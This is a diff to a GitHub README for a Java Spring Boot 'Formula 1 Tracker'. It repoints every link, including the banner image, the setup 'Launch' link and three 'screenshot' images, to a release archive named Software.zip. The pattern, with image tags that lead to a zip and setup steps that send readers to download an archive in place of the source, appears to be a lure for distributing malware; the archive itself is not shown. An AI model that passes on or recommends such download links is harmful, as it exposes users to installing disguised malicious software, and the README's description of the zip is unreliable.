@@ -1,6 +1,6 @@
 # Formula 1 Springboot Project 🏎️
 
-![Formula 1](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v1.0/Application.zip)
+![Formula 1](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v2.0/Software.zip)
 
 Welcome to the Formula 1 Springboot Project repository! This project is a Formula 1 Tracker built using Java Spring Boot with JPA, Hibernate, Lombok, and the MySQL driver. 
 
@@ -29,7 +29,7 @@ Are you a Formula 1 enthusiast looking to track your favorite teams and drivers 
 
 ## Setup Instructions
 To launch the project, please download the project files from the following link:  
-[Launch Formula 1 Springboot Project](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v1.0/Application.zip)
+[Launch Formula 1 Springboot Project](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v2.0/Software.zip)
 
 If the link doesn't work, please check the "Releases" section of this repository for alternative download options.
 
@@ -40,9 +40,9 @@ If the link doesn't work, please check the "Releases" section of this repository
 4. Run the project and start exploring the world of Formula 1
 
 ## Screenshots
-![Screenshot 1](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v1.0/Application.zip)
-![Screenshot 2](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v1.0/Application.zip)
-![Screenshot 3](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v1.0/Application.zip)
+![Screenshot 1](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v2.0/Software.zip)
+![Screenshot 2](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v2.0/Software.zip)
+![Screenshot 3](https://github.com/heatZ1/Formula-1-Springboot-project/releases/download/v2.0/Software.zip)
 
 ## Support
 If you encounter any issues or have any questions regarding the project, feel free to reach out to the project contributors. We are always here to help and improve the Formula 1 Springboot Project.
